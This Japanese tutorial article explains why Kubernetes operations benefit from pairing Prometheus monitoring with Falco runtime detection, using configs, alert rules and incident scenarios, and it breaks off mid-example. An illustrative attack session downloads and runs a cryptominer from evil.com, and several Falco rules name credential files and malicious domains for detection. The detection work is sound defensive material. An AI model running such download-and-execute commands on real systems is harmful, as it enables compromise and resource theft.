# Kubernetes に Prometheus と Falco が必須な理由 ― 運用とセキュリティの完全可視化

## はじめに：なぜ「見えない」が問題なのか

Kubernetes を本番運用していると、こんな経験はないでしょうか？

```bash
# 突然の障害アラート
$ kubectl get pods
NAME                    READY   STATUS             RESTARTS
api-server-abc123       0/1     CrashLoopBackOff   15

# Prometheus を見る
"CPU使用率が突然90%まで上昇"

# でも、なぜ？
→ どのプロセスが？
→ 誰が何をした？
→ 不正アクセス？
```

**メトリクスは"結果"を教えてくれますが、"原因"は教えてくれません。**

本記事では、

- **Prometheus（モニタリング）** = What happened?
- **Falco（ランタイムセキュリティ）** = Why / Who did what?

この2つを組み合わせることで、**運用とセキュリティの完全可視化**を実現する方法を解説します。

## 1. Kubernetes の優位性 ― なぜ"事実上の標準"になったか

### 1.1 技術的優位性の本質

Kubernetes の本質的な強みは **「動的・宣言的・自己修復」** にあります。

| 特性 | 説明 | 従来インフラとの違い |
|------|------|---------------------|
| **宣言的構成管理** | Desired State を YAML で定義 | 手順書ではなく「あるべき姿」を記述 |
| **自己修復** | Pod 障害時に自動再作成 | 人手での復旧作業が不要 |
| **動的スケジューリング** | リソースに応じて最適配置 | 静的なサーバ割り当てからの脱却 |
| **インフラ抽象化** | クラウド/オンプレ問わず動作 | ベンダーロックインからの解放 |

### 1.2 具体例：自己修復の威力

```yaml
# Deployment で「常に3つ動いている」を宣言
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api-server
spec:
  replicas: 3  # ← これが Desired State
  selector:
    matchLabels:
      app: api-server
  template:
    metadata:
      labels:
        app: api-server
    spec:
      containers:
      - name: api
        image: myapp:1.0
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
```

```bash
# Pod を1つ削除してみる
$ kubectl delete pod api-server-abc123
pod "api-server-abc123" deleted

# 数秒後...
$ kubectl get pods
NAME                    READY   STATUS    RESTARTS
api-server-abc123       1/1     Running   0        # ← 新しいPodが自動作成された
api-server-def456       1/1     Running   0
api-server-ghi789       1/1     Running   0
```

### 1.3 ECS vs Kubernetes ― どちらを選ぶべきか

コンテナオーケストレーションの選択肢として、**AWS ECS（Elastic Container Service）** も有力です。
両者を比較し、それぞれのメリット・デメリットを整理します。

#### 基本的な違い

| 項目 | Kubernetes | AWS ECS |
|------|-----------|---------|
| **提供元** | CNCF（オープンソース） | AWS（プロプライエタリ） |
| **マルチクラウド** | ◎ どこでも動作 | ✕ AWSのみ |
| **学習コスト** | 高い | 低い（AWS知識があれば） |
| **コントロールプレーン管理** | 必要（EKSなら不要） | 不要（フルマネージド） |
| **エコシステム** | 非常に豊富 | AWS サービスに特化 |

#### アーキテクチャ比較

**ECS のアーキテクチャ：**

```
┌─────────────────────────────────────────┐
│           AWS ECS Cluster               │
│                                         │
│  ┌──────────────┐  ┌──────────────┐   │
│  │ ECS Service  │  │ ECS Service  │   │
│  │              │  │              │   │
│  │ ┌─────────┐  │  │ ┌─────────┐  │   │
│  │ │  Task   │  │  │ │  Task   │  │   │
│  │ │Container│  │  │ │Container│  │   │
│  │ └─────────┘  │  │ └─────────┘  │   │
│  └──────────────┘  └──────────────┘   │
│         ↓                  ↓           │
│  ┌────────────────────────────────┐   │
│  │      ALB / NLB / API Gateway   │   │
│  └────────────────────────────────┘   │
└─────────────────────────────────────────┘
         ↓
    AWS サービス統合
    (CloudWatch, IAM, Secrets Manager...)
```

**Kubernetes のアーキテクチャ：**

```
┌─────────────────────────────────────────┐
│        Kubernetes Cluster               │
│                                         │
│  ┌──────────────┐  ┌──────────────┐   │
│  │ Deployment   │  │ Deployment   │   │
│  │              │  │              │   │
│  │ ┌─────────┐  │  │ ┌─────────┐  │   │
│  │ │   Pod   │  │  │ │   Pod   │  │   │
│  │ │Container│  │  │ │Container│  │   │
│  │ └─────────┘  │  │ └─────────┘  │   │
│  └──────────────┘  └──────────────┘   │
│         ↓                  ↓           │
│  ┌────────────────────────────────┐   │
│  │  Service / Ingress Controller  │   │
│  └────────────────────────────────┘   │
└─────────────────────────────────────────┘
         ↓
    マルチクラウド対応
    (AWS, GCP, Azure, オンプレミス)
```

#### メリット・デメリット比較

**ECS のメリット：**

| メリット | 説明 |
|---------|------|
| **AWS統合が簡単** | IAM、CloudWatch、Secrets Manager とシームレス連携 |
| **学習コストが低い** | AWS の知識があればすぐ使える |
| **運用が楽** | コントロールプレーンの管理不要 |
| **コストが明確** | EC2/Fargate の料金のみ（追加料金なし） |
| **デプロイが簡単** | Task Definition を JSON で定義するだけ |

**ECS のデメリット：**

| デメリット | 説明 |
|----------|------|
| **ベンダーロックイン** | AWS でしか動かない |
| **エコシステムが限定的** | Helm、Operator、CNCF ツールが使えない |
| **機能が限定的** | StatefulSet、DaemonSet 相当の機能が弱い |
| **マルチクラウド不可** | GCP、Azure への移行が困難 |
| **カスタマイズ性が低い** | Kubernetes ほど柔軟ではない |

**Kubernetes のメリット：**

| メリット | 説明 |
|---------|------|
| **ベンダーニュートラル** | どのクラウド・オンプレでも動作 |
| **エコシステムが豊富** | Helm、Operator、CNCF プロジェクトが使える |
| **機能が豊富** | StatefulSet、DaemonSet、CronJob など |
| **標準化** | 業界標準、人材も豊富 |
| **カスタマイズ性が高い** | あらゆる要件に対応可能 |

**Kubernetes のデメリット：**

| デメリット | 説明 |
|----------|------|
| **学習コストが高い** | 概念が多く、習得に時間がかかる |
| **運用が複雑** | コントロールプレーン管理（EKS なら緩和） |
| **過剰機能** | 小規模なら ECS で十分なことも |
| **トラブルシューティングが難しい** | 複雑なネットワーク、ログの追跡 |

#### 実装の違い：同じアプリをデプロイする例

**ECS の場合：**

```json
// ECS Task Definition
{
  "family": "api-server",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "containerDefinitions": [
    {
      "name": "api",
      "image": "myapp:1.0",
      "portMappings": [
        {
          "containerPort": 8080,
          "protocol": "tcp"
        }
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "/ecs/api-server",
          "awslogs-region": "us-east-1"
        }
      }
    }
  ]
}
```

```bash
# ECS Service 作成
$ aws ecs create-service \
  --cluster my-cluster \
  --service-name api-server \
  --task-definition api-server:1 \
  --desired-count 3 \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[subnet-xxx],securityGroups=[sg-xxx]}"
```

**Kubernetes の場合：**

```yaml
# Kubernetes Deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api-server
spec:
  replicas: 3
  selector:
    matchLabels:
      app: api-server
  template:
    metadata:
      labels:
        app: api-server
    spec:
      containers:
      - name: api
        image: myapp:1.0
        ports:
        - containerPort: 8080
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
---
apiVersion: v1
kind: Service
metadata:
  name: api-server
spec:
  selector:
    app: api-server
  ports:
  - port: 80
    targetPort: 8080
  type: LoadBalancer
```

```bash
# Kubernetes でデプロイ
$ kubectl apply -f api-server.yaml
```

#### 選択基準：どちらを選ぶべきか

```
┌─────────────────────────────────────────────────┐
│           ECS を選ぶべきケース                   │
├─────────────────────────────────────────────────┤
│ ✓ AWS のみで完結する                            │
│ ✓ 小〜中規模のアプリケーション                   │
│ ✓ 学習コストを抑えたい                          │
│ ✓ AWS サービスとの統合が最優先                  │
│ ✓ 運用リソースが限られている                    │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│        Kubernetes を選ぶべきケース               │
├─────────────────────────────────────────────────┤
│ ✓ マルチクラウド・ハイブリッドクラウド           │
│ ✓ 大規模・複雑なマイクロサービス                │
│ ✓ ベンダーロックインを避けたい                  │
│ ✓ CNCF エコシステムを活用したい                 │
│ ✓ 将来的な拡張性・柔軟性が重要                  │
│ ✓ 業界標準に準拠したい                          │
└─────────────────────────────────────────────────┘
```

#### 実際の採用例

| 企業 | 選択 | 理由 |
|------|------|------|
| **スタートアップA** | ECS | AWS のみで展開、少人数チーム、素早くリリースしたい |
| **中堅企業B** | Kubernetes | マルチクラウド戦略、将来の拡張性を重視 |
| **大企業C** | 両方併用 | レガシー: ECS、新規サービス: Kubernetes |
| **金融企業D** | Kubernetes | オンプレ + AWS のハイブリッド環境 |

#### 本記事では Kubernetes を前提とする理由

本記事で Kubernetes を前提とするのは、以下の理由からです：

1. **業界標準** - 事実上のデファクトスタンダード
2. **エコシステム** - Prometheus、Falco などの CNCF プロジェクトと親和性が高い
3. **マルチクラウド** - クラウドに依存しない監視・セキュリティ戦略
4. **複雑性** - だからこそ Prometheus と Falco が必須

ただし、**ECS でも Prometheus と CloudWatch Container Insights、AWS GuardDuty の組み合わせで同様の可視化は可能**です。

### 1.4 しかし、これが課題を生む

Kubernetes の動的な性質により、**「何が・どこで・いつ動いているか」が人間の把握を超えます**。

| 従来のインフラ | Kubernetes |
|---------------|-----------|
| サーバ: 固定IP | Pod: 数秒で変わるIP |
| プロセス: 数ヶ月〜数年稼働 | Pod: 数分で入れ替わる |
| 変更: 人が手動で実施 | 変更: システムが自動で実施 |
| 監視対象: 固定 | 監視対象: 常に変動 |

👉 **従来の「サーバ監視」の概念が完全に崩壊します**

## 2. なぜ Kubernetes には Prometheus が必須なのか

### 2.1 Kubernetes 特有の監視課題

Kubernetes 環境では、従来の監視ツール（Zabbix、Nagios など）が機能しない理由：

```bash
# 監視対象が固定できない例

# 10:00 - Pod の IP アドレス
$ kubectl get pod api-server-abc123 -o wide
NAME                 IP            NODE
api-server-abc123    10.244.1.5    worker-1

# 10:05 - Pod が再起動（IPが変わる）
$ kubectl get pod api-server-abc123 -o wide
NAME                 IP            NODE
api-server-xyz789    10.244.2.8    worker-2
```

**問題点：**
- IP アドレスが固定されない
- ホスト名が固定されない
- 数秒〜数分で Pod が消える
- 従来の「ホスト監視」では追跡不可能

### 2.2 Prometheus が Kubernetes にフィットする理由

| Kubernetes の性質 | Prometheus の特性 | 具体的な対応 |
|------------------|------------------|-------------|
| **Pod が動的に増減** | Service Discovery | Kubernetes APIを監視し自動検出 |
| **一時的な Pod** | Pull モデル（Scrape） | 存在する間だけメトリクス取得 |
| **ラベル文化** | Label-based メトリクス | ラベルで柔軟にグルーピング |
| **SLO/自動化** | Alertmanager | しきい値ベースの自動アラート |

### 2.3 Prometheus のアーキテクチャ

```
┌─────────────────────────────────────────────────────┐
│                  Kubernetes Cluster                  │
│                                                       │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐             │
│  │ Pod A   │  │ Pod B   │  │ Pod C   │             │
│  │ :9090   │  │ :9090   │  │ :9090   │             │
│  └────┬────┘  └────┬────┘  └────┬────┘             │
│       │            │            │                    │
│       └────────────┼────────────┘                    │
│                    │ metrics                         │
│              ┌─────▼─────┐                           │
│              │Prometheus │◄─── Service Discovery     │
│              │  Server   │     (Kubernetes API)      │
│              └─────┬─────┘                           │
│                    │                                 │
│              ┌─────▼─────┐                           │
│              │Alertmanager│─────► Slack/PagerDuty   │
│              └───────────┘                           │
│                    │                                 │
│              ┌─────▼─────┐                           │
│              │  Grafana  │◄───── Dashboard           │
│              └───────────┘                           │
└─────────────────────────────────────────────────────┘
```

### 2.4 実際の設定例

#### ServiceMonitor による自動監視設定

```yaml
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: api-server-monitor
  namespace: monitoring
spec:
  selector:
    matchLabels:
      app: api-server  # このラベルを持つServiceを監視
  endpoints:
  - port: metrics
    interval: 15s
    path: /metrics
```

#### Prometheus のクエリ例

```promql
# Pod の CPU 使用率（名前空間別）
sum(rate(container_cpu_usage_seconds_total{namespace="production"}[5m])) by (pod)

# HTTP リクエストレート（ステータスコード別）
sum(rate(http_requests_total[5m])) by (status_code)

# Pod の再起動回数（過去1時間）
increase(kube_pod_container_status_restarts_total[1h]) > 3
```

### 2.5 Prometheus が見る世界

Prometheus は主に **「正常に動いているか？」** を監視します：

| カテゴリ | 監視項目 | 例 |
|---------|---------|-----|
| **リソース** | CPU、メモリ、ディスク、ネットワーク | `container_cpu_usage_seconds_total` |
| **可用性** | Pod/Node/Namespace 状態 | `kube_pod_status_phase` |
| **パフォーマンス** | レイテンシ、エラー率、スループット | `http_request_duration_seconds` |
| **キャパシティ** | リソース使用率、飽和度 | `node_memory_utilization` |

### 2.6 Prometheus による実際のアラート設定

```yaml
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: api-server-alerts
  namespace: monitoring
spec:
  groups:
  - name: api-server
    interval: 30s
    rules:
    # Pod が頻繁に再起動
    - alert: PodRestartingTooOften
      expr: rate(kube_pod_container_status_restarts_total[15m]) > 0.1
      for: 5m
      labels:
        severity: warning
      annotations:
        summary: "Pod {{ $labels.pod }} is restarting frequently"
        description: "Pod has restarted {{ $value }} times in the last 15 minutes"

    # メモリ使用率が高い
    - alert: HighMemoryUsage
      expr: |
        (container_memory_working_set_bytes / container_spec_memory_limit_bytes) > 0.85
      for: 5m
      labels:
        severity: warning
      annotations:
        summary: "High memory usage in {{ $labels.pod }}"
        description: "Memory usage is {{ $value | humanizePercentage }}"

    # HTTP エラー率が高い
    - alert: HighErrorRate
      expr: |
        (sum(rate(http_requests_total{status=~"5.."}[5m])) by (service)
        /
        sum(rate(http_requests_total[5m])) by (service)) > 0.05
      for: 3m
      labels:
        severity: critical
      annotations:
        summary: "High HTTP error rate for {{ $labels.service }}"
        description: "Error rate is {{ $value | humanizePercentage }}"
```

## 3. しかし Prometheus だけでは足りない理由

### 3.1 Prometheus の限界

Prometheus は **"What happened"** は教えてくれますが、
**"Why / Who did what"** は分かりません。

#### 実例：謎のCPUスパイク

```bash
# Prometheus のグラフ
15:30 - CPU: 20%
15:35 - CPU: 95% ← 突然上昇！
15:40 - CPU: 25%

# Prometheus が教えてくれること
✅ CPU が 95% まで上昇した
✅ 15:35 に発生した
✅ Pod "api-server-abc123" で発生

# Prometheus が教えてくれないこと
❌ なぜ上昇したのか？
❌ どのプロセスが原因か？
❌ 誰が何をしたのか？
❌ 不正アクセスの可能性は？
```

### 3.2 Prometheus が見えない世界

| 監視項目 | Prometheus | 必要な理由 |
|---------|-----------|-----------|
| **ファイル操作** | ❌ 見えない | `/etc/passwd` 改ざん検知 |
| **プロセス実行** | ❌ 見えない | 不正なシェル起動検知 |
| **システムコール** | ❌ 見えない | 権限昇格の検知 |
| **ネットワーク接続** | △ 一部のみ | 不審な外部通信検知 |
| **コンテナ操作** | ❌ 見えない | `kubectl exec` の悪用検知 |
| **ユーザ操作** | ❌ 見えない | 誰が何をしたか |

### 3.3 典型的な「見えない攻撃」シナリオ

```bash
# ある日の本番環境

# 15:30 - 攻撃者が脆弱性を突いて Pod に侵入
$ kubectl exec -it api-server-abc123 -- /bin/bash
# ← Prometheus は検知できない

# 15:32 - 暗号通貨マイニングツールをダウンロード
root@api-server:/# curl -o /tmp/miner http://evil.com/cryptominer
# ← Prometheus は検知できない

# 15:33 - マイナーを起動
root@api-server:/# chmod +x /tmp/miner && /tmp/miner &
# ← Prometheus は検知できない

# 15:35 - CPU が 95% に上昇
# ← ★ここでようやく Prometheus がアラート

# でも...
# - 何が原因かは分からない
# - 攻撃が行われたことも分からない
# - 証拠も残っていない
```

👉 **これが「ランタイムセキュリティの空白地帯」**

## 4. Falco の役割 ― Kubernetes ランタイムセキュリティ

### 4.1 Falco とは何か

**Falco** は CNCF 卒業プロジェクトで、**「実行時に何が行われたか」を検知する** OSS です。

| 項目 | 説明 |
|------|------|
| **開発元** | Sysdig 社（現在は CNCF 管理） |
| **技術基盤** | eBPF / カーネルモジュール |
| **監視対象** | システムコール（syscall） |
| **動作モード** | リアルタイム検知 |
| **出力** | イベント（JSON） |

### 4.2 Falco のアーキテクチャ

```
┌─────────────────────────────────────────────────────┐
│                  Kubernetes Cluster                  │
│                                                       │
│  ┌─────────────────────────────────────┐             │
│  │         Linux Kernel                │             │
│  │                                     │             │
│  │  ┌───────────────────────────────┐  │             │
│  │  │      System Calls             │  │             │
│  │  │  (open, execve, connect...)   │  │             │
│  │  └───────────┬───────────────────┘  │             │
│  │              │                      │             │
│  │     ┌────────▼────────┐             │             │
│  │     │  eBPF Programs  │             │             │
│  │     └────────┬────────┘             │             │
│  └──────────────┼──────────────────────┘             │
│                 │                                     │
│           ┌─────▼─────┐                              │
│           │   Falco   │                              │
│           │  Engine   │                              │
│           └─────┬─────┘                              │
│                 │                                     │
│           ┌─────▼─────┐                              │
│           │   Rules   │◄─── Custom Rules             │
│           └─────┬─────┘                              │
│                 │                                     │
│           ┌─────▼─────┐                              │
│           │  Outputs  │─────► Slack / Syslog / File  │
│           └───────────┘                              │
└─────────────────────────────────────────────────────┘
```

### 4.3 Falco が見ているもの

Falco は **カーネルレベル** で以下を監視します：

| カテゴリ | 監視内容 | システムコール例 |
|---------|---------|----------------|
| **プロセス実行** | コンテナ内でのコマンド実行 | `execve`, `fork` |
| **ファイル操作** | 重要ファイルの読み書き | `open`, `write`, `unlink` |
| **ネットワーク** | 不審な外部通信 | `connect`, `bind` |
| **権限操作** | 権限昇格の試み | `setuid`, `setgid` |
| **コンテナ** | Pod/Container のメタデータ | Kubernetes API 連携 |

### 4.4 Falco のルール例

#### デフォルトルール：コンテナ内でのシェル起動

```yaml
- rule: Terminal shell in container
  desc: A shell was used as the entrypoint/exec point into a container with an attached terminal.
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint
  output: >
    A shell was spawned in a container with an attached terminal
    (user=%user.name user_loginuid=%user.loginuid
    %container.info shell=%proc.name parent=%proc.pname
    cmdline=%proc.cmdline terminal=%proc.tty
    container_id=%container.id image=%container.image.repository)
  priority: WARNING
  tags: [container, shell, mitre_execution]
```

#### カスタムルール：機密ファイルへのアクセス

```yaml
- rule: Read sensitive file in container
  desc: Detect attempts to read sensitive files
  condition: >
    open_read and container
    and fd.name in (/etc/shadow, /etc/sudoers, /root/.ssh/id_rsa)
  output: >
    Sensitive file opened for reading
    (user=%user.name command=%proc.cmdline file=%fd.name
    container=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [filesystem, security]
```

#### カスタムルール：外部への不審な通信

```yaml
- rule: Outbound connection to suspicious domain
  desc: Detect outbound connections to known malicious domains
  condition: >
    outbound and container
    and fd.sip.name in (evil.com, malware-c2.net, cryptominer.ru)
  output: >
    Suspicious outbound connection detected
    (user=%user.name command=%proc.cmdline
    destination=%fd.sip.name:%fd.sport
    container=%container.name)
  priority: CRITICAL
  tags: [network, security]
```

### 4.5 Falco のインストールと設定

#### Helm によるインストール

```bash
# Falco の Helm リポジトリを追加
$ helm repo add falcosecurity https://falcosecurity.github.io/charts
$ helm repo update

# Falco をインストール
$ helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set falco.grpc.enabled=true \
  --set falco.grpcOutput.enabled=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true
```

#### ConfigMap でカスタムルールを追加

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-custom-rules
  namespace: falco
data:
  custom-rules.yaml: |
    - rule: Unauthorized kubectl exec
      desc: Detect kubectl exec in production namespace
      condition: >
        spawned_process and container
        and k8s.ns.name = "production"
        and proc.name = "bash"
        and proc.pname = "kubectl"
      output: >
        Unauthorized kubectl exec detected in production
        (user=%k8s.user.name pod=%k8s.pod.name
        command=%proc.cmdline)
      priority: CRITICAL
      tags: [kubernetes, security]

    - rule: Package manager in production
      desc: Detect package manager usage in production containers
      condition: >
        spawned_process and container
        and k8s.ns.name = "production"
        and proc.name in (apt, apt-get, yum, dnf, apk)
      output: >
        Package manager executed in production container
        (user=%user.name container=%container.name
        command=%proc.cmdline)
      priority: WARNING
      tags: [container, security]
```

### 4.6 Falco の出力先設定

```yaml
# falco-values.yaml
falco:
  grpc:
    enabled: true
  grpcOutput:
    enabled: true

falcosidekick:
  enabled: true
  config:
    slack:
      webhookurl: "https://hooks.slack.com/services/XXX/YYY/ZZZ"
      minimumpriority: "warning"
      messageformat: "long"

    elasticsearch:
      hostport: "elasticsearch:9200"
      index: "falco"
      type: "event"

    loki:
      hostport: "loki:3100"
      minimumpriority: "warning"

    webhook:
      address: "http://my-webhook-service:8080/falco"
      customHeaders:
        Authorization: "Bearer mytoken"
```

## 5. Prometheus × Falco = 完全な可視化

### 5.1 2つのツールの相補関係

| 観点 | Prometheus | Falco |
|------|-----------|-------|
| **目的** | 可用性・性能監視 | セキュリティ・コンプライアンス |
| **見るもの** | メトリクス（集計値） | イベント（個別の行為） |
| **時間軸** | 集計・傾向分析 | リアルタイム検知 |
| **問い** | 正常に動いているか？ | 何をしたか？誰が？ |
| **アクション** | しきい値超過でアラート | 不正行為の即時検知 |
| **データ量** | 小（集計済み） | 大（全イベント） |

### 5.2 統合アーキテクチャ

```
┌────────────────────────────────────────────────────────┐
│              Kubernetes Cluster                         │
│                                                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐             │
│  │  Pod A   │  │  Pod B   │  │  Pod C   │             │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘             │
│       │             │             │                     │
│       │ metrics     │             │ syscalls            │
│       │             │             │                     │
│  ┌────▼─────────────▼─┐      ┌───▼──────┐             │
│  │    Prometheus      │      │  Falco   │             │
│  └────┬───────────────┘      └───┬──────┘             │
│       │                          │                     │
│       │ alerts                   │ events              │
│       │                          │                     │
│  ┌────▼────────────────┐    ┌───▼──────────┐          │
│  │  Alertmanager       │    │ Falcosidekick│          │
│  └────┬────────────────┘    └───┬──────────┘          │
│       │                          │                     │
└───────┼──────────────────────────┼─────────────────────┘
        │                          │
        │     ┌────────────────────┘
        │     │
        ▼     ▼
    ┌─────────────┐
    │    Slack    │
    │  PagerDuty  │
    │   Grafana   │
    └─────────────┘
```

### 5.3 実践例：統合運用のシナリオ

#### シナリオ1：CPU スパイクの原因特定

**従来（Prometheus のみ）：**

```
15:35 - Prometheus Alert: High CPU Usage (95%)
       → ❓ 原因不明
       → 手動調査が必要
       → 時間がかかる
```

**統合運用（Prometheus + Falco）：**

```
15:33 - Falco Alert:
        "Suspicious process spawned in container"
        User: www-data
        Command: /tmp/cryptominer --pool evil.com
        Container: api-server-abc123

15:35 - Prometheus Alert:
        "High CPU Usage (95%)"
        Pod: api-server-abc123

👉 相関分析により即座に原因特定：
   暗号通貨マイニング攻撃
```

#### シナリオ2：Pod 再起動の根本原因

**Prometheus が検知：**
```promql
# Pod が過去1時間で5回再起動
increase(kube_pod_container_status_restarts_total{pod="api-server"}[1h]) > 5
```

**Falco が検知：**
```json
{
  "rule": "Write below binary dir",
  "priority": "ERROR",
  "output": "File below /usr/bin modified (user=root command=apt-get file=/usr/bin/malware)",
  "time": "2025-01-15T15:33:00Z",
  "output_fields": {
    "container.name": "api-server",
    "proc.name": "apt-get",
    "fd.name": "/usr/bin/malware"
  }
}
```

**結論：**
- Prometheus：Pod が再起動している（事実）
- Falco：誰かが `/usr/bin` 配下を改ざんした（原因）
- 👉 不正なバイナリ配置 → セキュリティインシデント

#### シナリオ3：本番環境への不正アクセス

**Falco が検知：**
```yaml
Rule: Terminal shell in container
Priority: WARNING
Output: |
  A shell was spawned in a container
  User: john.doe@example.com
  Pod: api-server-prod-xyz
  Namespace: production
  Command: kubectl exec -it api-server-prod-xyz -- /bin/bash
  Time: 2025-01-15 15:45:00
```

**Prometheus が検知：**
```promql
# その直後にメモリ使用量が急増
container_memory_working_set_bytes{pod="api-server-prod-xyz"}
```

**アクション：**
1. Falco アラートで即座に検知
2. Slack に通知 → セキュリティチーム対応
3. 当該 Pod を隔離（NetworkPolicy で遮断）
4. インシデント調査開始

### 5.4 統合ダッシュボード（Grafana）

```json
{
  "dashboard": {
    "title": "Security & Performance Overview",
    "panels": [
      {
        "title": "Prometheus: Pod Restarts",
        "targets": [
          {
            "expr": "rate(kube_pod_container_status_restarts_total[5m])"
          }
        ]
      },
      {
        "title": "Falco: Security Events by Severity",
        "targets": [
          {
            "expr": "sum(falco_events_total) by (priority)"
          }
        ]
      },
      {
        "title": "Correlation: CPU vs Security Events",
        "targets": [
          {
            "expr": "rate(container_cpu_usage_seconds_total[5m])"
          },
          {
            "expr": "rate(falco_events_total{priority=\"critical\"}[5m])"
          }
        ]
      }
    ]
  }
}
```

## 6. 実装のベストプラクティス

### 6.1 Prometheus のベストプラクティス

#### ① 適切な Scrape Interval 設定

```yaml
global:
  scrape_interval: 15s     # デフォルト: 15秒
  evaluation_interval: 15s # ルール評価: 15秒

scrape_configs:
  - job_name: 'kubernetes-pods'
    scrape_interval: 30s   # 負荷の低いメトリクスは長めに

  - job_name: 'critical-services'
    scrape_interval: 5s    # 重要なサービスは短めに
```

#### ② Recording Rules で高頻度クエリを最適化

```yaml
groups:
  - name: performance
    interval: 30s
    rules:
    - record: job:http_requests:rate5m
      expr: sum(rate(http_requests_total[5m])) by (job)

    - record: job:http_errors:rate5m
      expr: sum(rate(http_requests_total{status=~"5.."}[5m])) by (job)
```

#### ③ データ保持期間の最適化

```yaml
# Prometheus StatefulSet
spec:
  containers:
  - name: prometheus
    args:
    - --storage.tsdb.retention.time=15d  # 15日間保持
    - --storage.tsdb.retention.size=50GB # 50GB上限
    - --storage.tsdb.path=/prometheus
    volumeMounts:
    - name: storage
      mountPath: /prometheus
```

### 6.2 Falco のベストプラクティス

#### ① 環境別ルール設定

```yaml
# development 環境：検知のみ
customRules:
  dev-rules.yaml: |
    - rule: Shell in container (dev)
      condition: spawned_process and container and k8s.ns.name = "development"
      output: "Shell detected in dev (user=%user.name pod=%k8s.pod.name)"
      priority: INFO

# production 環境：即座にアラート
customRules:
  prod-rules.yaml: |
    - rule: Shell in container (prod)
      condition: spawned_process and container and k8s.ns.name = "production"
      output: "CRITICAL: Shell in production (user=%user.name pod=%k8s.pod.name)"
      priority: CRITICAL
      tags: [security, incident]
```

#### ② False Positive の削減

```yaml
# 正常な挙動を除外
- list: allowed_binaries
  items: [/usr/bin/healthcheck, /usr/bin/metrics-exporter]

- rule: Suspicious binary executed
  condition: >
    spawned_process and container
    and not proc.name in (allowed_binaries)
    and proc.name startswith "/tmp"
  output: "Suspicious binary from /tmp (command=%proc.cmdline)"
  priority: WARNING
```

#### ③ パフォーマンス最適化

```yaml
# Falco DaemonSet のリソース設定
resources:
  requests:
    cpu: 100m
    memory: 512Mi
  limits:
    cpu: 1000m
    memory: 1Gi

# eBPF モード（カーネルモジュールより軽量）
driver:
  kind: ebpf
  ebpf:
    hostNetwork: true
```

### 6.3 統合運用のベストプラクティス

#### ① アラート疲労の防止

```yaml
# Alertmanager - アラートのグルーピング
route:
  group_by: ['alertname', 'namespace']
  group_wait: 30s
  group_interval: 5m
  repeat_interval: 12h

  routes:
  # CRITICAL は即座に通知
  - match:
      severity: critical
    receiver: pagerduty
    continue: true

  # WARNING は5分間隔でまとめる
  - match:
      severity: warning
    receiver: slack
    group_wait: 5m
    group_interval: 10m
```

#### ② イベントの相関分析

```python
# 擬似コード：Prometheus と Falco のイベント相関
import prometheus_api_client
import falco_client

def correlate_events():
    # Prometheus から CPU スパイクを取得
    cpu_spikes = prometheus.query(
        'rate(container_cpu_usage_seconds_total[5m]) > 0.8'
    )

    # 同じ時間帯の Falco イベントを取得
    for spike in cpu_spikes:
        pod_name = spike['pod']
        timestamp = spike['timestamp']

        falco_events = falco.query(
            pod=pod_name,
            time_range=(timestamp - 5m, timestamp + 5m)
        )

        if falco_events:
            alert(
                f"Correlation found: {pod_name}",
                f"CPU spike + Security event: {falco_events}"
            )
```

#### ③ ログの長期保存

```yaml
# Elasticsearch へのエクスポート
falcosidekick:
  config:
    elasticsearch:
      hostport: "elasticsearch:9200"
      index: "falco"
      type: "event"
      minimumpriority: "notice"

# Prometheus の長期保存（Thanos）
thanos:
  enabled: true
  objectStorageConfig:
    type: S3
    config:
      bucket: prometheus-long-term
      endpoint: s3.amazonaws.com
```

## 7. トラブルシューティング実例

### 7.1 ケース1：謎のメモリリーク

**症状：**
```bash
$ kubectl get pods
NAME                 READY   STATUS             RESTARTS
api-server-abc       0/1     OOMKilled          10
```

**Prometheus の調査：**
```promql
# メモリ使用量が徐々に増加
container_memory_working_set_bytes{pod="api-server-abc"}
→ 512Mi（Limit）に到達して OOMKilled
```

**Falco の調査：**
```json
{
  "rule": "Read sensitive file",
  "output": "Sensitive file opened (file=/proc/self/maps command=node user=root)",
  "time": "15:30:00"
}
```

**結論：**
- アプリケーションが `/proc/self/maps` を繰り返し読み取り
- メモリマップ情報の蓄積でメモリリーク
- 👉 コードの修正が必要

### 7.2 ケース2：間欠的な接続エラー

**症状：**
```
Client → API Server → Database
         ↓
      時々タイムアウト
```

**Prometheus の調査：**
```promql
# HTTP リクエストのレイテンシ
histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))
→ P99 で 5秒超え（通常は 100ms）
```

**Falco の調査：**
```yaml
Rule: Unauthorized process opened network connection
Output: |
  Process opened connection to external IP
  (command=/tmp/backup.sh destination=203.0.113.50:22)
```

**結論：**
- 誰かが `/tmp/backup.sh` を配置
- 大量のデータを外部転送中
- ネットワーク帯域を圧迫
- 👉 不正なスクリプトを削除、NetworkPolicy で遮断

### 7.3 ケース3：突然のクラスタ全体の性能劣化

**症状：**
```bash
$ kubectl top nodes
NAME       CPU%   MEMORY%
worker-1   95%    80%
worker-2   90%    75%
worker-3   92%    78%
```

**Prometheus の調査：**
```promql
# すべてのノードで CPU 高負荷
node_cpu_utilization > 0.9
```

**Falco の調査：**
```json
[
  {
    "rule": "Cryptocurrency Mining Activity",
    "output": "Crypto mining detected (command=/usr/bin/xmrig pool=pool.minexmr.com)",
    "pod": "frontend-xyz",
    "priority": "CRITICAL"
  },
  {
